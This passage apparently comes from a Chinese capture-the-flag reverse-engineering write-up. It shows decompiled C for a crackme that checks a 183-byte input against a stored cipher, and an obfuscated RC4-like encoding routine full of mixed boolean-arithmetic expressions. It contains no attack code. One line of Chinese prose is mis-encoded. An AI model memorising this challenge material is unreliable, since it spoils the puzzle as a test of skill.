</span></span><span class="line"><span class="cl">  <span class="nf">obf_encode</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">n_4</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v5</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">n_4</span> <span class="o">==</span> <span class="mi">183</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nf">memcmp</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">cipher</span><span class="p">,</span> <span class="mh">0xB7uLL</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Congratulations! </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Try again?</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é¢˜æ ¸å¿ƒåœ¨åŠ å¯†ç”¨äº†æ··æ·†å¯¼è‡´å¾ˆéš¾çœ‹æ‡‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">obf_encode</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="n">a1</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">a2</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">a3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kr">__int64</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// rax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// r9d
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// r10d
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// r8d
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// edx
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// r14d
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v9</span><span class="p">;</span> <span class="c1">// edx
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v10</span><span class="p">;</span> <span class="c1">// r9d
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v11</span><span class="p">;</span> <span class="c1">// r11d
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v12</span><span class="p">;</span> <span class="c1">// edx
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v13</span><span class="p">;</span> <span class="c1">// r15d
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v14</span><span class="p">;</span> <span class="c1">// r13d
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v15</span><span class="p">;</span> <span class="c1">// r11d
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v16</span><span class="p">;</span> <span class="c1">// ebx
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v17</span><span class="p">;</span> <span class="c1">// edi
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v18</span><span class="p">;</span> <span class="c1">// ecx
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v19</span><span class="p">;</span> <span class="c1">// r14d
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-48h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="n">v21</span><span class="p">;</span> <span class="c1">// [rsp+1Eh] [rbp-42h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="n">v22</span><span class="p">;</span> <span class="c1">// [rsp+1Fh] [rbp-41h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v22</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v21</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">init_encode</span><span class="p">(</span><span class="n">a3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">i</span> <span class="o">&gt;=</span> <span class="n">a2</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v22</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)(</span><span class="mi">2</span> <span class="o">*</span> <span class="o">~</span><span class="p">(</span><span class="o">~</span><span class="n">v22</span> <span class="o">|</span> <span class="o">~</span><span class="p">(</span><span class="n">v22</span> <span class="o">&amp;</span> <span class="mi">1</span> <span class="o">|</span> <span class="o">~</span><span class="n">v22</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFE</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">              <span class="o">+</span> <span class="p">(</span><span class="o">~</span><span class="p">(</span><span class="o">~</span><span class="n">v22</span> <span class="o">|</span> <span class="mi">1</span> <span class="o">|</span> <span class="o">~</span><span class="p">(((</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="o">~</span><span class="p">((</span><span class="n">v22</span> <span class="o">&amp;</span> <span class="mh">0xF8</span> <span class="o">|</span> <span class="o">~</span><span class="n">v22</span> <span class="o">&amp;</span> <span class="mi">7</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0xF8</span><span class="p">)</span> <span class="o">^</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">))</span> <span class="o">|</span> <span class="p">(</span><span class="o">~</span><span class="p">(</span><span class="o">~</span><span class="n">v22</span> <span class="o">|</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x40D14331</span> <span class="o">|</span> <span class="o">~</span><span class="n">v22</span> <span class="o">&amp;</span> <span class="mh">0xBF2EBCCE</span><span class="p">)</span> <span class="o">^</span> <span class="p">(((</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="o">~</span><span class="p">((</span><span class="n">v22</span> <span class="o">&amp;</span> <span class="mh">0xF8</span> <span class="o">|</span> <span class="o">~</span><span class="n">v22</span> <span class="o">&amp;</span> <span class="mi">7</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0xF8</span><span class="p">)</span> <span class="o">^</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span> <span class="o">|</span> <span class="o">~</span><span class="p">(((</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="o">~</span><span class="p">((</span><span class="n">v22</span> <span class="o">&amp;</span> <span class="mh">0xF8</span> <span class="o">|</span> <span class="o">~</span><span class="n">v22</span> <span class="o">&amp;</span> <span class="mi">7</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0xF8</span><span class="p">)</span> <span class="o">^</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xBF2EBCCE</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">        <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v4</span> <span class="o">=</span> <span class="p">(</span><span class="n">v21</span> <span class="o">&amp;</span> <span class="mh">0xBB</span> <span class="o">|</span> <span class="o">~</span><span class="n">v21</span> <span class="o">&amp;</span> <span class="mh">0x12F4FC44</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0xED0B03BB</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v5</span> <span class="o">=</span> <span class="p">(</span><span class="n">mysterious_box</span><span class="p">[</span><span class="n">v22</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x19</span> <span class="o">|</span> <span class="o">~</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">mysterious_box</span><span class="p">[</span><span class="n">v22</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x11CE2FE6</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0xEE31D019</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v6</span> <span class="o">=</span> <span class="o">~</span><span class="p">(</span><span class="o">~</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">mysterious_box</span><span class="p">[</span><span class="n">v22</span><span class="p">]</span> <span class="o">|</span> <span class="mh">0xAB5D4C24</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">v7</span> <span class="o">=</span> <span class="n">v6</span> <span class="o">^</span> <span class="n">v5</span> <span class="o">&amp;</span> <span class="p">((</span><span class="n">mysterious_box</span><span class="p">[</span><span class="n">v22</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x19</span> <span class="o">|</span> <span class="o">~</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">mysterious_box</span><span class="p">[</span><span class="n">v22</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x11CE2FE6</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0xBA9363C2</span><span class="p">)</span> <span class="o">|</span> <span class="n">v6</span> <span class="o">&amp;</span> <span class="n">v5</span> <span class="o">&amp;</span> <span class="p">((</span><span class="n">mysterious_box</span><span class="p">[</span><span class="n">v22</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x19</span> <span class="o">|</span> <span class="o">~</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">mysterious_box</span><span class="p">[</span><span class="n">v22</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x11CE2FE6</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0xBA9363C2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">v8</span> <span class="o">=</span> <span class="o">~</span><span class="n">v7</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="p">(</span><span class="o">~</span><span class="n">v21</span> <span class="o">|</span> <span class="mh">0xAB5D4C24</span><span class="p">)</span> <span class="o">^</span> <span class="n">v4</span> <span class="o">&amp;</span> <span class="p">((</span><span class="n">v21</span> <span class="o">&amp;</span> <span class="mh">0xBB</span> <span class="o">|</span> <span class="o">~</span><span class="n">v21</span> <span class="o">&amp;</span> <span class="mh">0x12F4FC44</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0xB9A9B060</span><span class="p">)</span> <span class="o">|</span> <span class="o">~</span><span class="p">(</span><span class="o">~</span><span class="n">v21</span> <span class="o">|</span> <span class="mh">0xAB5D4C24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">v4</span> <span class="o">&amp;</span> <span class="p">((</span><span class="n">v21</span> <span class="o">&amp;</span> <span class="mh">0xBB</span> <span class="o">|</span> <span class="o">~</span><span class="n">v21</span> <span class="o">&amp;</span> <span class="mh">0x12F4FC44</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0xB9A9B060</span><span class="p">))</span> <span class="o">|</span> <span class="o">~</span><span class="p">(</span><span class="o">~</span><span class="p">(</span><span class="o">~</span><span class="n">v21</span> <span class="o">|</span> <span class="mh">0xAB5D4C24</span><span class="p">)</span> <span class="o">^</span> <span class="n">v4</span> <span class="o">&amp;</span> <span class="p">((</span><span class="n">v21</span> <span class="o">&amp;</span> <span class="mh">0xBB</span> <span class="o">|</span> <span class="o">~</span><span class="n">v21</span> <span class="o">&amp;</span> <span class="mh">0x12F4FC44</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0xB9A9B060</span><span class="p">)</span> <span class="o">|</span> <span class="o">~</span><span class="p">(</span><span class="o">~</span><span class="n">v21</span> <span class="o">|</span> <span class="mh">0xAB5D4C24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">v4</span> <span class="o">&amp;</span> <span class="p">((</span><span class="n">v21</span> <span class="o">&amp;</span> <span class="mh">0xBB</span> <span class="o">|</span> <span class="o">~</span><span class="n">v21</span> <span class="o">&amp;</span> <span class="mh">0x12F4FC44</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0xB9A9B060</span><span class="p">))</span> <span class="o">&amp;</span> <span class="n">v7</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v9</span> <span class="o">=</span> <span class="o">~</span><span class="p">(</span><span class="o">~</span><span class="p">(</span><span class="o">~</span><span class="n">v5</span> <span class="o">|</span> <span class="o">~</span><span class="n">v4</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">v5</span> <span class="o">&amp;</span> <span class="mh">0x8174B0F</span> <span class="o">|</span> <span class="o">~</span><span class="n">v5</span> <span class="o">&amp;</span> <span class="mh">0xF7E8B4F0</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">v4</span> <span class="o">&amp;</span> <span class="mh">0x8174B0F</span> <span class="o">|</span> <span class="o">~</span><span class="n">v4</span> <span class="o">&amp;</span> <span class="mh">0xF7E8B4F0</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="n">v10</span> <span class="o">=</span> <span class="o">~</span><span class="p">(</span><span class="o">~</span><span class="n">v5</span> <span class="o">|</span> <span class="o">~</span><span class="n">v4</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">v5</span> <span class="o">&amp;</span> <span class="mh">0x8174B0F</span> <span class="o">|</span> <span class="o">~</span><span class="n">v5</span> <span class="o">&amp;</span> <span class="mh">0xF7E8B4F0</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">v4</span> <span class="o">&amp;</span> <span class="mh">0x8174B0F</span> <span class="o">|</span> <span class="o">~</span><span class="n">v4</span> <span class="o">&amp;</span> <span class="mh">0xF7E8B4F0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">v11</span> <span class="o">=</span> <span class="o">~</span><span class="p">(</span><span class="n">v10</span> <span class="o">|</span> <span class="o">~</span><span class="n">v8</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">v9</span> <span class="o">&amp;</span> <span class="mh">0x29D2D441</span> <span class="o">|</span> <span class="n">v10</span> <span class="o">&amp;</span> <span class="mh">0xD62D2BBE</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">v8</span> <span class="o">&amp;</span> <span class="mh">0x29D2D441</span> <span class="o">|</span> <span class="o">~</span><span class="n">v8</span> <span class="o">&amp;</span> <span class="mh">0xD62D2BBE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">v12</span> <span class="o">=</span> <span class="p">(</span><span class="n">mysterious_box</span><span class="p">[</span><span class="n">v22</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xE4</span> <span class="o">|</span> <span class="o">~</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">mysterious_box</span><span class="p">[</span><span class="n">v22</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x6559491B</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0x9AA6B6E4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v21</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)(</span><span class="n">v11</span> <span class="o">-</span> <span class="p">((</span><span class="n">v12</span> <span class="o">^</span> <span class="o">~</span><span class="n">v21</span> <span class="o">|</span> <span class="n">v12</span> <span class="o">&amp;</span> <span class="o">~</span><span class="n">v21</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">))</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">exchange_encode</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">mysterious_box</span><span class="p">[</span><span class="n">v22</span><span class="p">],</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">mysterious_box</span><span class="p">[</span><span class="n">v21</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="n">v13</span> <span class="o">=</span> <span class="o">~</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">mysterious_box</span><span class="p">[</span><span class="n">v21</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">v14</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">mysterious_box</span><span class="p">[</span><span class="n">v22</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">mysterious_box</span><span class="p">[</span><span class="n">v22</span><span class="p">]</span> <span class="o">^</span> <span class="mh">0xC38D792B</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">v15</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">mysterious_box</span><span class="p">[</span><span class="n">v21</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">mysterious_box</span><span class="p">[</span><span class="n">v21</span><span class="p">]</span> <span class="o">^</span> <span class="mh">0xC38D792B</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">v16</span> <span class="o">=</span> <span class="n">v15</span> <span class="o">^</span> <span class="o">~</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">mysterious_box</span><span class="p">[</span><span class="n">v21</span><span class="p">]</span> <span class="o">|</span> <span class="mh">0x3C7286D4</span><span class="p">)</span> <span class="o">|</span> <span class="n">v15</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">mysterious_box</span><span class="p">[</span><span class="n">v21</span><span class="p">]</span> <span class="o">|</span> <span class="mh">0x3C7286D4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">v17</span> <span class="o">=</span> <span class="p">(</span><span class="n">v16</span> <span class="o">&amp;</span> <span class="mh">0xA864AC02</span> <span class="o">|</span> <span class="o">~</span><span class="n">v16</span> <span class="o">&amp;</span> <span class="mh">0x579B53FD</span><span class="p">)</span> <span class="o">^</span> <span class="p">((</span><span class="n">v14</span> <span class="o">^</span> <span class="o">~</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">mysterious_box</span><span class="p">[</span><span class="n">v22</span><span class="p">]</span> <span class="o">|</span> <span class="mh">0x3C7286D4</span><span class="p">)</span> <span class="o">|</span> <span class="n">v14</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">mysterious_box</span><span class="p">[</span><span class="n">v22</span><span class="p">]</span> <span class="o">|</span> <span class="mh">0x3C7286D4</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xA864AC02</span> <span class="o">|</span> <span class="o">~</span><span class="p">(</span><span class="n">v14</span> <span class="o">^</span> <span class="o">~</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">mysterious_box</span><span class="p">[</span><span class="n">v22</span><span class="p">]</span> <span class="o">|</span> <span class="mh">0x3C7286D4</span><span class="p">)</span> <span class="o">|</span> <span class="n">v14</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">mysterious_box</span><span class="p">[</span><span class="n">v22</span><span class="p">]</span> <span class="o">|</span> <span class="mh">0x3C7286D4</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0x579B53FD</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">v18</span> <span class="o">=</span> <span class="o">~</span><span class="n">v17</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v19</span> <span class="o">=</span> <span class="o">~</span><span class="p">(</span><span class="o">~</span><span class="p">(((</span><span class="n">v13</span> <span class="o">^</span> <span class="o">~</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">mysterious_box</span><span class="p">[</span><span class="n">v22</span><span class="p">]</span> <span class="o">|</span> <span class="n">v13</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">mysterious_box</span><span class="p">[</span><span class="n">v22</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xADFAC042</span> <span class="o">|</span> <span class="o">~</span><span class="p">(</span><span class="n">v13</span> <span class="o">^</span> <span class="o">~</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">mysterious_box</span><span class="p">[</span><span class="n">v22</span><span class="p">]</span> <span class="o">|</span> <span class="n">v13</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">mysterious_box</span><span class="p">[</span><span class="n">v22</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0x52053FBD</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0xADFAC042</span><span class="p">)</span> <span class="o">|</span> <span class="n">v18</span><span class="p">)</span> <span class="o">|</span> <span class="p">((((</span><span class="n">v13</span> <span class="o">^</span> <span class="o">~</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">mysterious_box</span><span class="p">[</span><span class="n">v22</span><span class="p">]</span> <span class="o">|</span> <span class="n">v13</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">mysterious_box</span><span class="p">[</span><span class="n">v22</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xADFAC042</span> <span class="o">|</span> <span class="o">~</span><span class="p">(</span><span class="n">v13</span> <span class="o">^</span> <span class="o">~</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">mysterious_box</span><span class="p">[</span><span class="n">v22</span><span class="p">]</span> <span class="o">|</span> <span class="n">v13</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">mysterious_box</span><span class="p">[</span><span class="n">v22</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0x52053FBD</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0xADFAC042</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x354E9C1B</span> <span class="o">|</span> <span class="o">~</span><span class="p">(((</span><span class="n">v13</span> <span class="o">^</span> <span class="o">~</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">mysterious_box</span><span class="p">[</span><span class="n">v22</span><span class="p">]</span> <span class="o">|</span> <span class="n">v13</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">mysterious_box</span><span class="p">[</span><span class="n">v22</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xADFAC042</span> <span class="o">|</span> <span class="o">~</span><span class="p">(</span><span class="n">v13</span> <span class="o">^</span> <span class="o">~</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">mysterious_box</span><span class="p">[</span><span class="n">v22</span><span class="p">]</span> <span class="o">|</span> <span class="n">v13</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">mysterious_box</span><span class="p">[</span><span class="n">v22</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0x52053FBD</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0xADFAC042</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xCAB163E4</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">v17</span> <span class="o">&amp;</span> <span class="mh">0x354E9C1B</span> <span class="o">|</span> <span class="n">v18</span> <span class="o">&amp;</span> <span class="mh">0xCAB163E4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">a1</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+=</span> <span class="n">mysterious_box</span><span class="p">[(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)((</span><span class="kt">int</span><span class="p">)(</span><span class="n">v19</span>
